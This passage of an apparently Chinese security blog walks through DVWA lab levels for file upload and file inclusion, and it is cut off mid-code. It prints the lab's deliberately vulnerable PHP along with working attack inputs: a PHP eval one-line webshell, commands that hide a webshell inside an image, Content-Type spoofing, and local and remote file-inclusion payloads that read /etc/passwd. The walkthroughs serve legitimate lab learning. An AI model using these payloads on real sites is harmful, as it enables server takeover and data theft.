class="hljs-variable">$_FILES</span>[ <span class="hljs-string">&#x27;uploaded&#x27;</span> ][ <span class="hljs-string">&#x27;tmp_name&#x27;</span> ], <span class="hljs-variable">$target_path</span> ) ) &#123;<br>        <span class="hljs-comment">// No</span><br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;&#x27;</span>;<br>    &#125;<br>    <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-comment">// Yes!</span><br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;pre&gt;<span class="hljs-subst">&#123;$target_path&#125;</span> succesfully uploaded!&lt;/pre&gt;&quot;</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h2 id="攻击思路"><a href="#攻击思路" class="headerlink" title="攻击思路"></a>攻击思路</h2><ul><li>一句马.上传一个exp.php,内容为 <code>&lt;?php @eval($_REQUEST[&quot;ant&quot;]) ?&gt;</code></li></ul><h2 id="攻击结果"><a href="#攻击结果" class="headerlink" title="攻击结果"></a>攻击结果</h2><p><img src="/2022/06/04/dvwa-file-upload/1691945800889.png" alt="1691945800889"></p><h1 id="medium"><a href="#medium" class="headerlink" title="medium"></a>medium</h1><h2 id="源码-1"><a href="#源码-1" class="headerlink" title="源码"></a>源码</h2><p>源码如下，_FILES 是 HTTP 文件上传变量，它是一个通过 HTTP POST 方式上传到当前脚本的项目的数组。由此可见源码会获取文件的文件名、文件类型和文件大小，它要求文件类型必须是 jpeg 或者 png，同时限制文件大小不能超过 100000B（约为97.6KB）。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-keyword">if</span>( <span class="hljs-keyword">isset</span>( <span class="hljs-variable">$_POST</span>[ <span class="hljs-string">&#x27;Upload&#x27;</span> ] ) ) &#123;<br>    <span class="hljs-comment">// Where are we going to be writing to?</span><br>    <span class="hljs-variable">$target_path</span>  = DVWA_WEB_PAGE_TO_ROOT . <span class="hljs-string">&quot;hackable/uploads/&quot;</span>;<br>    <span class="hljs-variable">$target_path</span> .= <span class="hljs-title function_ invoke__">basename</span>( <span class="hljs-variable">$_FILES</span>[ <span class="hljs-string">&#x27;uploaded&#x27;</span> ][ <span class="hljs-string">&#x27;name&#x27;</span> ] );<br><br>    <span class="hljs-comment">// File information</span><br>    <span class="hljs-variable">$uploaded_name</span> = <span class="hljs-variable">$_FILES</span>[ <span class="hljs-string">&#x27;uploaded&#x27;</span> ][ <span class="hljs-string">&#x27;name&#x27;</span> ];<br>    <span class="hljs-variable">$uploaded_type</span> = <span class="hljs-variable">$_FILES</span>[ <span class="hljs-string">&#x27;uploaded&#x27;</span> ][ <span class="hljs-string">&#x27;type&#x27;</span> ];<br>    <span class="hljs-variable">$uploaded_size</span> = <span class="hljs-variable">$_FILES</span>[ <span class="hljs-string">&#x27;uploaded&#x27;</span> ][ <span class="hljs-string">&#x27;size&#x27;</span> ];<br><br>    <span class="hljs-comment">// Is it an image?</span><br>    <span class="hljs-keyword">if</span>( ( <span class="hljs-variable">$uploaded_type</span> == <span class="hljs-string">&quot;image/jpeg&quot;</span> || <span class="hljs-variable">$uploaded_type</span> == <span class="hljs-string">&quot;image/png&quot;</span> ) &amp;&amp;<br>        ( <span class="hljs-variable">$uploaded_size</span> &lt; <span class="hljs-number">100000</span> ) ) &#123;<br><br>        <span class="hljs-comment">// Can we move the file to the upload folder?</span><br>        <span class="hljs-keyword">if</span>( !<span class="hljs-title function_ invoke__">move_uploaded_file</span>( <span class="hljs-variable">$_FILES</span>[ <span class="hljs-string">&#x27;uploaded&#x27;</span> ][ <span class="hljs-string">&#x27;tmp_name&#x27;</span> ], <span class="hljs-variable">$target_path</span> ) ) &#123;<br>            <span class="hljs-comment">// No</span><br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;&#x27;</span>;<br>        &#125;<br>        <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-comment">// Yes!</span><br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;pre&gt;<span class="hljs-subst">&#123;$target_path&#125;</span> succesfully uploaded!&lt;/pre&gt;&quot;</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-comment">// Invalid file</span><br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;pre&gt;Your image was not uploaded. We can only accept JPEG or PNG images.&lt;/pre&gt;&#x27;</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-meta">?&gt;</span><br><br></code></pre></td></tr></table></figure><h2 id="攻击思路-1"><a href="#攻击思路-1" class="headerlink" title="攻击思路"></a>攻击思路</h2><p>medium源码主要对 <code>Content-type</code>字段进行过滤，所以解决方法</p><ul><li>修改http请求头为 <code>Content-type: image/png</code>，可以用BurpSuite，浏览器开发者工具F12编辑请求重发</li></ul><h2 id="攻击结果-1"><a href="#攻击结果-1" class="headerlink" title="攻击结果"></a>攻击结果</h2><p><img src="/2022/06/04/dvwa-file-upload/1691946804800.png" alt="1691946804800"></p><h1 id="high"><a href="#high" class="headerlink" title="high"></a>high</h1><h2 id="源码-2"><a href="#源码-2" class="headerlink" title="源码"></a>源码</h2><p>源码如下，strrpos(string,find,start) 函数返回字符串 find 在另一字符串 string 中最后一次出现的位置，如果没有找到字符串则返回 false，可选参数 start 规定在何处开始搜索。getimagesize(string filename) 函数会通过读取文件头，返回图片的长、宽等信息，如果没有相关的图片文件头则报错。源码通过字符串匹配来确定文件后缀名，并且查看文件的相关参数，提高了过滤的强度。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-keyword">if</span>( <span class="hljs-keyword">isset</span>( <span class="hljs-variable">$_POST</span>[ <span class="hljs-string">&#x27;Upload&#x27;</span> ] ) ) &#123;<br>    <span class="hljs-comment">// Where are we going to be writing to?</span><br>    <span class="hljs-variable">$target_path</span>  = DVWA_WEB_PAGE_TO_ROOT . <span class="hljs-string">&quot;hackable/uploads/&quot;</span>;<br>    <span class="hljs-variable">$target_path</span> .= <span class="hljs-title function_ invoke__">basename</span>( <span class="hljs-variable">$_FILES</span>[ <span class="hljs-string">&#x27;uploaded&#x27;</span> ][ <span class="hljs-string">&#x27;name&#x27;</span> ] );<br><br>    <span class="hljs-comment">// File information</span><br>    <span class="hljs-variable">$uploaded_name</span> = <span class="hljs-variable">$_FILES</span>[ <span class="hljs-string">&#x27;uploaded&#x27;</span> ][ <span class="hljs-string">&#x27;name&#x27;</span> ];<br>    <span class="hljs-variable">$uploaded_ext</span>  = <span class="hljs-title function_ invoke__">substr</span>( <span class="hljs-variable">$uploaded_name</span>, <span class="hljs-title function_ invoke__">strrpos</span>( <span class="hljs-variable">$uploaded_name</span>, <span class="hljs-string">&#x27;.&#x27;</span> ) + <span class="hljs-number">1</span>);<br>    <span class="hljs-variable">$uploaded_size</span> = <span class="hljs-variable">$_FILES</span>[ <span class="hljs-string">&#x27;uploaded&#x27;</span> ][ <span class="hljs-string">&#x27;size&#x27;</span> ];<br>    <span class="hljs-variable">$uploaded_tmp</span>  = <span class="hljs-variable">$_FILES</span>[ <span class="hljs-string">&#x27;uploaded&#x27;</span> ][ <span class="hljs-string">&#x27;tmp_name&#x27;</span> ];<br><br>    <span class="hljs-comment">// Is it an image?</span><br>    <span class="hljs-keyword">if</span>( ( <span class="hljs-title function_ invoke__">strtolower</span>( <span class="hljs-variable">$uploaded_ext</span> ) == <span class="hljs-string">&quot;jpg&quot;</span> || <span class="hljs-title function_ invoke__">strtolower</span>( <span class="hljs-variable">$uploaded_ext</span> ) == <span class="hljs-string">&quot;jpeg&quot;</span> || <span class="hljs-title function_ invoke__">strtolower</span>( <span class="hljs-variable">$uploaded_ext</span> ) == <span class="hljs-string">&quot;png&quot;</span> ) &amp;&amp;<br>        ( <span class="hljs-variable">$uploaded_size</span> &lt; <span class="hljs-number">100000</span> ) &amp;&amp;<br>        <span class="hljs-title function_ invoke__">getimagesize</span>( <span class="hljs-variable">$uploaded_tmp</span> ) ) &#123;<br><br>        <span class="hljs-comment">// Can we move the file to the upload folder?</span><br>        <span class="hljs-keyword">if</span>( !<span class="hljs-title function_ invoke__">move_uploaded_file</span>( <span class="hljs-variable">$uploaded_tmp</span>, <span class="hljs-variable">$target_path</span> ) ) &#123;<br>            <span class="hljs-comment">// No</span><br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;&#x27;</span>;<br>        &#125;<br>        <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-comment">// Yes!</span><br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;pre&gt;<span class="hljs-subst">&#123;$target_path&#125;</span> succesfully uploaded!&lt;/pre&gt;&quot;</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-comment">// Invalid file</span><br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;pre&gt;Your image was not uploaded. We can only accept JPEG or PNG images.&lt;/pre&gt;&#x27;</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure><h2 id="攻击思路-2"><a href="#攻击思路-2" class="headerlink" title="攻击思路"></a>攻击思路</h2><ol><li>由于源码会去检查文件头，现在我们不能再传 php 文件了，应该把一句话木马包在一张图片里面。</li></ol><ul><li>Linux下图片马制作</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">将 shell.php 内容追加到 pic.png</span><br>cat shell.php &gt;&gt; pic.png<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">png + php 合成 png 图马</span><br>cat pic.png shell.php &gt;&gt; shell.png<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">直接 <span class="hljs-built_in">echo</span> 追加</span><br>echo &#x27;&lt;?php phpinfo();?&gt;&#x27; &gt;&gt; pic.png<br></code></pre></td></tr></table></figure><ul><li>Windows下图片马制作</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">copy pic.png/b+shell.php/a shell.png<br></code></pre></td></tr></table></figure><ol start="2"><li>图马制作完成之后我们就已经可以绕过 getimagesize 函数的检测了，接下来主要是绕过对后缀的检测。这里暂时无法绕过检测，目前只能借助文件包含或者命令执行漏洞来进一步 Getshell</li></ol><ul><li>利用high级别文件包含漏洞，蚁剑连接(似乎需要带上cookie，才能成功)<br><code>http://localhost:4280/vulnerabilities/fi/?page=file:///var/www/html/hackable/uploads/shell.png</code></li></ul><h1 id="impossible"><a href="#impossible" class="headerlink" title="impossible"></a>impossible</h1><p>继续学习！不要放弃！</p><h2 id="源码-3"><a href="#源码-3" class="headerlink" title="源码"></a>源码</h2><p>看到代码检查了medium,high级别的内容，并且重新md5生成了新的文件名,重新生成了png/jpg图片，每一步都校验了属于是。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-keyword">if</span>( <span class="hljs-keyword">isset</span>( <span class="hljs-variable">$_POST</span>[ <span class="hljs-string">&#x27;Upload&#x27;</span> ] ) ) &#123;<br>    <span class="hljs-comment">// Check Anti-CSRF token</span><br>    <span class="hljs-title function_ invoke__">checkToken</span>( <span class="hljs-variable">$_REQUEST</span>[ <span class="hljs-string">&#x27;user_token&#x27;</span> ], <span class="hljs-variable">$_SESSION</span>[ <span class="hljs-string">&#x27;session_token&#x27;</span> ], <span class="hljs-string">&#x27;index.php&#x27;</span> );<br><br><br>    <span class="hljs-comment">// File information</span><br>    <span class="hljs-variable">$uploaded_name</span> = <span class="hljs-variable">$_FILES</span>[ <span class="hljs-string">&#x27;uploaded&#x27;</span> ][ <span class="hljs-string">&#x27;name&#x27;</span> ];<br>    <span class="hljs-variable">$uploaded_ext</span>  = <span class="hljs-title function_ invoke__">substr</span>( <span class="hljs-variable">$uploaded_name</span>, <span class="hljs-title function_ invoke__">strrpos</span>( <span class="hljs-variable">$uploaded_name</span>, <span class="hljs-string">&#x27;.&#x27;</span> ) + <span class="hljs-number">1</span>);<br>    <span class="hljs-variable">$uploaded_size</span> = <span class="hljs-variable">$_FILES</span>[ <span class="hljs-string">&#x27;uploaded&#x27;</span> ][ <span class="hljs-string">&#x27;size&#x27;</span> ];<br>    <span class="hljs-variable">$uploaded_type</span> = <span class="hljs-variable">$_FILES</span>[ <span class="hljs-string">&#x27;uploaded&#x27;</span> ][ <span class="hljs-string">&#x27;type&#x27;</span> ];<br>    <span class="hljs-variable">$uploaded_tmp</span>  = <span class="hljs-variable">$_FILES</span>[ <span class="hljs-string">&#x27;uploaded&#x27;</span> ][ <span class="hljs-string">&#x27;tmp_name&#x27;</span> ];<br><br>    <span class="hljs-comment">// Where are we going to be writing to?</span><br>    <span class="hljs-variable">$target_path</span>   = DVWA_WEB_PAGE_TO_ROOT . <span class="hljs-string">&#x27;hackable/uploads/&#x27;</span>;<br>    <span class="hljs-comment">//$target_file   = basename( $uploaded_name, &#x27;.&#x27; . $uploaded_ext ) . &#x27;-&#x27;;</span><br>    <span class="hljs-variable">$target_file</span>   =  <span class="hljs-title function_ invoke__">md5</span>( <span class="hljs-title function_ invoke__">uniqid</span>() . <span class="hljs-variable">$uploaded_name</span> ) . <span class="hljs-string">&#x27;.&#x27;</span> . <span class="hljs-variable">$uploaded_ext</span>;<br>    <span class="hljs-variable">$temp_file</span>     = ( ( <span class="hljs-title function_ invoke__">ini_get</span>( <span class="hljs-string">&#x27;upload_tmp_dir&#x27;</span> ) == <span class="hljs-string">&#x27;&#x27;</span> ) ? ( <span class="hljs-title function_ invoke__">sys_get_temp_dir</span>() ) : ( <span class="hljs-title function_ invoke__">ini_get</span>( <span class="hljs-string">&#x27;upload_tmp_dir&#x27;</span> ) ) );<br>    <span class="hljs-variable">$temp_file</span>    .= DIRECTORY_SEPARATOR . <span class="hljs-title function_ invoke__">md5</span>( <span class="hljs-title function_ invoke__">uniqid</span>() . <span class="hljs-variable">$uploaded_name</span> ) . <span class="hljs-string">&#x27;.&#x27;</span> . <span class="hljs-variable">$uploaded_ext</span>;<br><br>    <span class="hljs-comment">// Is it an image?</span><br>    <span class="hljs-keyword">if</span>( ( <span class="hljs-title function_ invoke__">strtolower</span>( <span class="hljs-variable">$uploaded_ext</span> ) == <span class="hljs-string">&#x27;jpg&#x27;</span> || <span class="hljs-title function_ invoke__">strtolower</span>( <span class="hljs-variable">$uploaded_ext</span> ) == <span class="hljs-string">&#x27;jpeg&#x27;</span> || <span class="hljs-title function_ invoke__">strtolower</span>( <span class="hljs-variable">$uploaded_ext</span> ) == <span class="hljs-string">&#x27;png&#x27;</span> ) &amp;&amp;<br>        ( <span class="hljs-variable">$uploaded_size</span> &lt; <span class="hljs-number">100000</span> ) &amp;&amp;<br>        ( <span class="hljs-variable">$uploaded_type</span> == <span class="hljs-string">&#x27;image/jpeg&#x27;</span> || <span class="hljs-variable">$uploaded_type</span> == <span class="hljs-string">&#x27;image/png&#x27;</span> ) &amp;&amp;<br>        <span class="hljs-title function_ invoke__">getimagesize</span>( <span class="hljs-variable">$uploaded_tmp</span> ) ) &#123;<br><br>        <span class="hljs-comment">// Strip any metadata, by re-encoding image (Note, using php-Imagick is recommended over php-GD)</span><br>        <span class="hljs-keyword">if</span>( <span class="hljs-variable">$uploaded_type</span> == <span class="hljs-string">&#x27;image/jpeg&#x27;</span> ) &#123;<br>            <span class="hljs-variable">$img</span> = <span class="hljs-title function_ invoke__">imagecreatefromjpeg</span>( <span class="hljs-variable">$uploaded_tmp</span> );<br>            <span class="hljs-title function_ invoke__">imagejpeg</span>( <span class="hljs-variable">$img</span>, <span class="hljs-variable">$temp_file</span>, <span class="hljs-number">100</span>);<br>        &#125;<br>        <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-variable">$img</span> = <span class="hljs-title function_ invoke__">imagecreatefrompng</span>( <span class="hljs-variable">$uploaded_tmp</span> );<br>            <span class="hljs-title function_ invoke__">imagepng</span>( <span class="hljs-variable">$img</span>, <span class="hljs-variable">$temp_file</span>, <span class="hljs-number">9</span>);<br>        &#125;<br>        <span class="hljs-title function_ invoke__">imagedestroy</span>( <span class="hljs-variable">$img</span> );<br><br>        <span class="hljs-comment">// Can we move the file to the web root from the temp folder?</span><br>        <span class="hljs-keyword">if</span>( <span class="hljs-title function_ invoke__">rename</span>( <span class="hljs-variable">$temp_file</span>, ( <span class="hljs-title function_ invoke__">getcwd</span>() . DIRECTORY_SEPARATOR . <span class="hljs-variable">$target_path</span> . <span class="hljs-variable">$target_file</span> ) ) ) &#123;<br>            <span class="hljs-comment">// Yes!</span><br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;pre&gt;&lt;a href=&#x27;<span class="hljs-subst">&#123;$target_path&#125;</span><span class="hljs-subst">&#123;$target_file&#125;</span>&#x27;&gt;<span class="hljs-subst">&#123;$target_file&#125;</span>&lt;/a&gt; succesfully uploaded!&lt;/pre&gt;&quot;</span>;<br>        &#125;<br>        <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-comment">// No</span><br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;&#x27;</span>;<br>        &#125;<br><br>        <span class="hljs-comment">// Delete any temp files</span><br>        <span class="hljs-keyword">if</span>( <span class="hljs-title function_ invoke__">file_exists</span>( <span class="hljs-variable">$temp_file</span> ) )<br>            <span class="hljs-title function_ invoke__">unlink</span>( <span class="hljs-variable">$temp_file</span> );<br>    &#125;<br>    <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-comment">// Invalid file</span><br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;pre&gt;Your image was not uploaded. We can only accept JPEG or PNG images.&lt;/pre&gt;&#x27;</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-comment">// Generate Anti-CSRF token</span><br><span class="hljs-title function_ invoke__">generateSessionToken</span>();<br><br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>在向网页上传文件时，如果服务器端代码未对客户端上传的文件进行严格的验证和过滤，就容易被上传上来的脚本文件等木马攻击。这类脚本称之为 WebShell，用户可以利用这种恶意脚本查看服务器目录、修改服务器文件和执行系统命令等。<br>为了防御这种攻击，可以使用白名单判断文件类型和后缀是否合法，同时对上传后的文件进行重命名防止被攻击者利用。</p>]]></content>
    
    
    <categories>
      
      <category>渗透测试</category>
      
      <category>靶场</category>
      
    </categories>
    
    
    <tags>
      
      <tag>文件上传</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>dvwa-file-inclusion</title>
    <link href="/2022/06/04/dvwa-file-inclusion/"/>
    <url>/2022/06/04/dvwa-file-inclusion/</url>
    
    <content type="html"><![CDATA[<blockquote><p>有些 web 应用程序允许用户指定直接文件流的输入，或允许用户将文件上载到服务器。稍后 web 应用程序访问 web 应用程序上下文中用户提供的输入。通过这样种操作，web 应用程序允许恶意文件执行。<br>如果选择要包含的文件是目标计算机上的本地文件，则称为“本地文件包含（LFI）”。但是文件也可能包含在其他机器上，这样的攻击就是“远程文件包含（RFI）”。</p></blockquote><h1 id="请求页面"><a href="#请求页面" class="headerlink" title="请求页面"></a>请求页面</h1><p><img src="/2022/06/04/dvwa-file-inclusion/1691911280888.png" alt="1691911280888"></p><h1 id="http请求"><a href="#http请求" class="headerlink" title="http请求"></a>http请求</h1><p>页面有三个文件按钮，这里以file1.php为例吧</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">GET</span> <span class="hljs-string">/vulnerabilities/fi/?page=file1.php</span> <span class="hljs-meta">HTTP/1.1</span><br></code></pre></td></tr></table></figure><p>#响应页面<br>页面显示了 <code>用户名</code> 和 <code>IP address</code><br><img src="/2022/06/04/dvwa-file-inclusion/1691911789840.png" alt="1691911789840"></p><h1 id="low"><a href="#low" class="headerlink" title="low"></a>low</h1><h2 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h2><p>page 参数没有任何过滤，然后直接被 include 包含进来，造成文件包含漏洞的产生。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-comment">// The page we wish to display</span><br><span class="hljs-variable">$file</span> = <span class="hljs-variable">$_GET</span>[ <span class="hljs-string">&#x27;page&#x27;</span> ];<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h2 id="攻击思路"><a href="#攻击思路" class="headerlink" title="攻击思路"></a>攻击思路</h2><ul><li>本地文件包含(绝对路径或者相对路径，注意不同平台的/和\)<ul><li><code>page=/etc/passwd</code></li><li><code>page=../../hackable/flags/fi.php</code></li></ul></li><li>远程文件包含 <code>page=http://www.baidu.com/robots.txt</code></li><li>其他伪协议：<ul><li><code>php://</code></li><li><code>data://</code></li><li><code>file://</code></li></ul></li></ul><h2 id="攻击结果"><a href="#攻击结果" class="headerlink" title="攻击结果"></a>攻击结果</h2><h1 id="medium"><a href="#medium" class="headerlink" title="medium"></a>medium</h1><h2 id="源码-1"><a href="#源码-1" class="headerlink" title="源码"></a>源码</h2><p>源码如下，代码增加了 str_replace 函数对 page 参数进行了过滤。<br>将 “http://”、“https://”替换为空阻止远程包含漏洞，将“../”、“..\” 替换为空阻止用相对路径访问文件。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-comment">// The page we wish to display</span><br><span class="hljs-variable">$file</span> = <span class="hljs-variable">$_GET</span>[ <span class="hljs-string">&#x27;page&#x27;</span> ];<br><br><span class="hljs-comment">// Input validation</span><br><span class="hljs-variable">$file</span> = <span class="hljs-title function_ invoke__">str_replace</span>( <span class="hljs-keyword">array</span>( <span class="hljs-string">&quot;http://&quot;</span>, <span class="hljs-string">&quot;https://&quot;</span> ), <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$file</span> );<br><span class="hljs-variable">$file</span> = <span class="hljs-title function_ invoke__">str_replace</span>( <span class="hljs-keyword">array</span>( <span class="hljs-string">&quot;../&quot;</span>, <span class="hljs-string">&quot;..\\&quot;</span> ), <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$file</span> );<br><br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure><h2 id="攻击思路-1"><a href="#攻击思路-1" class="headerlink" title="攻击思路"></a>攻击思路</h2><ul><li>嵌套双写<ul><li><code>page=hhttps://ttps://www.baidu.com/robots.txt</code></li><li><code>page=..././..././hackable/flags/fi.php</code></li></ul></li><li>绝对路径仍然没有过滤<ul><li><code>page=/etc/passwd</code></li></ul></li></ul><h1 id="high"><a href="#high" class="headerlink" title="high"></a>high</h1><h2 id="源码-2"><a href="#源码-2" class="headerlink" title="源码"></a>源码</h2><p>开发者已经受够了，他们决定只允许使用某些文件。但是由于存在多个具有相同基名的文件，因此它们使用通配符将它们全部包括在内。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-comment">// The page we wish to display</span><br><span class="hljs-variable">$file</span> = <span class="hljs-variable">$_GET</span>[ <span class="hljs-string">&#x27;page&#x27;</span> ];<br><br><span class="hljs-comment">// Input validation</span><br><span class="hljs-keyword">if</span>( !<span class="hljs-title function_ invoke__">fnmatch</span>( <span class="hljs-string">&quot;file*&quot;</span>, <span class="hljs-variable">$file</span> ) &amp;&amp; <span class="hljs-variable">$file</span> != <span class="hljs-string">&quot;include.php&quot;</span> ) &#123;<br>    <span class="hljs-comment">// This isn&#x27;t the page we want!</span><br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;ERROR: File not found!&quot;</span>;<br>    <span class="hljs-keyword">exit</span>;<br>&#125;<br><br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure><h2 id="攻击思路-2"><a href="#攻击思路-2" class="headerlink" title="攻击思路"></a>攻击思路</h2><p>代码里面要求 page 参数的开头必须是 file，但是实在太巧合了，我们依然可以利用 file 伪协议读取到文件内容。</p><ul><li><code>page=file:///etc/passwd</code></li></ul><h1 id="impossible"><a href="#impossible" class="headerlink" title="impossible"></a>impossible</h1><p>学习了学习了！瞧黑板！</p><h2 id="源码-3"><a href="#源码-3" class="headerlink" title="源码"></a>源码</h2><p>直接白名单了相当于，就这几个文件可以包含。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-comment">// The page we wish to display</span><br><span class="hljs-variable">$file</span> = <span class="hljs-variable">$_GET</span>[ <span class="hljs-string">&#x27;page&#x27;</span> ];<br><br><span class="hljs-comment">// Only allow include.php or file&#123;1..3&#125;.php</span><br><span class="hljs-keyword">if</span>( <span class="hljs-variable">$file</span> != <span class="hljs-string">&quot;include.php&quot;</span> &amp;&amp; <span class="hljs-variable">$file</span> != <span 